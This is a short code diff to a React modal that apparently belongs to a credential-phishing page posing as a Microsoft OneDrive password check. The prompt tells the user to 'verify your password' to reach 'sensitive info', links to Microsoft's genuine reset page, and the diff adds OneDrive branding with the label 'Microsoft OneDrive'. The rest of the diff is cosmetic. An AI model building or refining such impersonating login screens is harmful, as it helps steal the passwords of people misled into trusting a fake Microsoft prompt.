@@ -1,6 +1,6 @@
 import Modal from "react-modal";
 import { useState } from "react";
-import axios from "axios";
+import Image from "next/image";
 
 const customStyles = {
   overlay: {
@@ -51,15 +51,15 @@ function PopUpModal({ isOpen, handleClose, error }) {
           </h2>
           {error ? (
             <span className="text-sm text-red-500">
-              {error} if you don't remember your password,{" "}
+              {error} {`if you don't remember your password,`}
               <a href="https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/login.srf%3fcobrandid%3d90015%26id%3d292841%26cobrandid%3d90015%26uaid%3d77a752de46ed4d5897e5f73360a3fde9%26id%3d292841%26contextid%3d2CF9084A013B1018%26opid%3dA007932B9F57B8DB%26bk%3d1680001408&id=292841&uiflavor=web&cobrandid=90015&uaid=77a752de46ed4d5897e5f73360a3fde9&mkt=EN-US&lc=1033&bk=1680001408">
                 <span className="text-[#0078D4]">reset it now</span>
               </a>
             </span>
           ) : (
             <span className="text-sm">
-              Because you're accessing sensitive info, you need to verify your
-              password
+              {`Because you're accessing sensitive info, you need to verify your
+              password`}
             </span>
           )}
         </div>
@@ -90,7 +90,10 @@ function PopUpModal({ isOpen, handleClose, error }) {
           Continue
         </button>
 
-        <img src="./img/OneDrive.svg" alt="" />
+        <div className="flex flex-col items-center">
+          <Image width={50} height={60} src="/img/OneDrive.svg" alt="" />
+          <span className="text-gray-700 font-bold">Microsoft OneDrive</span>
+        </div>
       </form>
     </Modal>
   );
